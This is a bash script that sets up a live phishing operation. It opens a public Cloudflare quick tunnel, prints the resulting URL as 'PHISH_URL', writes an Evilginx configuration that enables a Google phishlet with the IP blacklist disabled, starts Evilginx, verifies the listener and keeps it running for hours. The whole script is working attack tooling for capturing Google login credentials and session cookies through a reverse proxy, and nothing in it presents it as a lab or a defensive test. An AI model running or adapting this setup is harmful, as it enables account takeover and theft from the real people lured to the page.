#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true

echo "--- starting tunnel first ---"
nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }

echo "--- writing evilginx config (enable google phishlet) ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null

echo "--- starting evilginx ---"
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer 2>&1 | tee evilginx.log &

echo "--- waiting for :443 (up to 60s) ---"
BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "PORT443_BOUND=$BOUND"
curl -k -sS -m 6 -o /dev/null -w 'ORIGIN_HTTP:%{http_code}\n' https://localhost/ 2>&1 || echo "ORIGIN_PROBE_FAIL"

echo "=== streaming evilginx output ==="
trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
